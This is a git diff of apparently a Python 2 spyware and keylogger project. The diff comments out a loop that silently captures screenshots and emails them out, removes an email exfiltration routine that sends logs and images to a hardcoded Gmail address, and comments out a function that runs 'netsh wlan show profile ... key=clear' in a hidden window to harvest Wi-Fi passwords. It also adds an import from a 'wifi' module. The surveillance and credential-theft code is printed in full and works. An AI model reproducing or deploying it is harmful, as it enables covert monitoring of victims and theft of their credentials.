@@ -5,7 +5,7 @@ from Settings import *
 from paths import *
 from get_history import *
 from send_emails import *
-
+from wifi import *
 
 def save_to_file(logs, file_name):
 
@@ -234,31 +234,31 @@ def get_all_open_windows(): # TO-DO: break them into more function
     save_to_file('=' * 50,logs_file)
     save_to_file('\n\n',logs_file)
     
-    
-def capture_screenshots(file_path): #DONE
-
-    """This function takes snap shots of
-        the host machine and send them by email.
-        Every 13 captures image, an email is sent"""
-
-    if not os.path.exists(file_path):
-        os.mkdir(file_path)
-
-    counter = 0 # counter to create multiple screen shots
-
-    while True:
-
-        time.sleep(5)
-        image = ImageGrab.grab() # grab the image
-        save_as = os.path.join(file_path,'ScreenShot_' +time.strftime('%Y_%m_%d') + str(counter) + '.jpg') 
-        image.save(save_as)
-        counter += 1
-
-        if counter == 3:
-            print "there is 3 pics in the folder"
-            send_new_email(file_path)
-            delete_images(file_path)
-            counter = 0 
+##    
+##def capture_screenshots(file_path): #DONE
+##
+##    """This function takes snap shots of
+##        the host machine and send them by email.
+##        Every 13 captures image, an email is sent"""
+##
+##    if not os.path.exists(file_path):
+##        os.mkdir(file_path)
+##
+##    counter = 0 # counter to create multiple screen shots
+##
+##    while True:
+##
+##        time.sleep(5)
+##        image = ImageGrab.grab() # grab the image
+##        save_as = os.path.join(file_path,'ScreenShot_' +time.strftime('%Y_%m_%d') + str(counter) + '.jpg') 
+##        image.save(save_as)
+##        counter += 1
+##
+##        if counter == 3:
+##            print "there is 3 pics in the folder"
+##            send_new_email(file_path)
+##            delete_images(file_path)
+##            counter = 0 
 
 
 def delete_images(file_name): #Done
@@ -277,58 +277,6 @@ def delete_files(file_name): #Done
         # delete all images that ends with .jpg permenatly
         os.unlink(files)
                     
-
-##def send_new_email(folder_path):
-##    
-##    """This function sends logs through emails"""
-##    
-##    login_pass = ''
-##    to_ = 'keyplexer@gmail.com'
-##    from_ = 'keyplexer@gmail.com'
-##    
-##    # Create the container (outer) email message.
-##    message = MIMEMultipart()
-##    message['Subject'] = 'Great Trip'
-##    message['From'] = from_
-##    message['To'] = to_
-##
-##    # Assume we know that the image files are all in PNG format
-##    
-##    if folder_path.endswith('Screenshots'):
-##        for file in glob.glob(folder_path + '\\*.jpg'):
-##            images_file = open(file, 'rb')
-##            img = MIMEImage(images_file.read())
-##            images_file.close()
-##            message.attach(img)
-##
-##   
-##    elif folder_path.endswith('Logs'):
-##        
-##        for file in glob.glob(folder_path + '\\*.txt'):
-##    
-##            # if the file ends with txt, attach it
-##            if file.endswith('.txt'):
-##                #Encoders.encode_base64(message)
-##                output_file = open(file)
-##                attachment = MIMEText(output_file.read())
-##                output_file.close()
-##    
-##            # attach the file
-##            attachment.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
-##            message.attach(attachment)
-##         
-##    else:
-##        # TO DO "SEND ALERT EMAIL OR MESSAGE"
-##        print "NOT JPG FILE"
-##        
-##    # Send the email
-##    smtp_server = smtplib.SMTP('smtp.gmail.com:587')
-##    smtp_server.starttls() # adds TLS encyprtion
-##    smtp_server.login(to_, login_pass)
-##    smtp_server.sendmail(to_, from_, message.as_string())
-##    smtp_server.quit()
-
-
 def send_txt_message():
  
     """This function uses send text messages
@@ -336,58 +284,58 @@ def send_txt_message():
     pass
 
 
-def get_wifi_credentials():
-
-    """This function get the credentials of the connected
-        interface"""
-    
-    threading.Timer(6, get_wifi_credentials).start() 
-    
-   # try:
-    file_name = open(creds, "a+")
-    
-    # execture cmd commands silently wihtout poping window
-    si = subprocess.STARTUPINFO()
-
-    # dwflag is a parameter that tells the function
-    # what type of information to gather
-    si.dwFlags = subprocess.STARTF_USESHOWWINDOW
-
-    # execute interface command to show the current connected interface,
-    # the command is exexuted silently
-    subprocess.call("netsh wlan show interfaces", stdout=file_name , startupinfo=si)
-
-    # Once the command executer, get the name of the interface
-    # extract all words and put them in a list
-    creds_file = open(creds, 'r')
-    text = creds_file.read()
-    creds_file.close()
-    
-    # look for the colon that separates profile name form the actual name
-    text = re.sub('[\: \']+', " ", text)
-    words = list(text.split())
-
-
-    # loop through the list and get the interface name
-    output_list = []
-    for word in words:
-        output_list.append(word)
-
-    word_index = output_list.index('connected') + 2
-
-    #print output_list[word_index]
-
-    # if word "Profile" in the saved file, get the password credentials of the connected
-    # interface
-    if 'Profile' in open(creds).read():
-        subprocess.call("netsh wlan show profile name="+ output_list[word_index] + " key=clear", stdout=file_name, startupinfo=si)
-    else:
-        print "False"
-
-##    except:
-##                # TODO SEND AN ALERT EMAIL WITH ERRO
-##                print "There is something worng with extarcting wifi passwords"
+##def get_wifi_credentials():
 ##
+##    """This function get the credentials of the connected
+##        interface"""
+##    
+##    threading.Timer(6, get_wifi_credentials).start() 
+##    
+##   # try:
+##    file_name = open(creds, "a+")
+##    
+##    # execture cmd commands silently wihtout poping window
+##    si = subprocess.STARTUPINFO()
+##
+##    # dwflag is a parameter that tells the function
+##    # what type of information to gather
+##    si.dwFlags = subprocess.STARTF_USESHOWWINDOW
+##
+##    # execute interface command to show the current connected interface,
+##    # the command is exexuted silently
+##    subprocess.call("netsh wlan show interfaces", stdout=file_name , startupinfo=si)
+##
+##    # Once the command executer, get the name of the interface
+##    # extract all words and put them in a list
+##    creds_file = open(creds, 'r')
+##    text = creds_file.read()
+##    creds_file.close()
+##    
+##    # look for the colon that separates profile name form the actual name
+##    text = re.sub('[\: \']+', " ", text)
+##    words = list(text.split())
+##
+##
+##    # loop through the list and get the interface name
+##    output_list = []
+##    for word in words:
+##        output_list.append(word)
+##
+##    word_index = output_list.index('connected') + 2
+##
+##    #print output_list[word_index]
+##
+##    # if word "Profile" in the saved file, get the password credentials of the connected
+##    # interface
+##    if 'Profile' in open(creds).read():
+##        subprocess.call("netsh wlan show profile name="+ output_list[word_index] + " key=clear", stdout=file_name, startupinfo=si)
+##    else:
+##        print "False"
+##
+####    except:
+####                # TODO SEND AN ALERT EMAIL WITH ERRO
+####                print "There is something worng with extarcting wifi passwords"
+####
             
             
 def begin_logging():
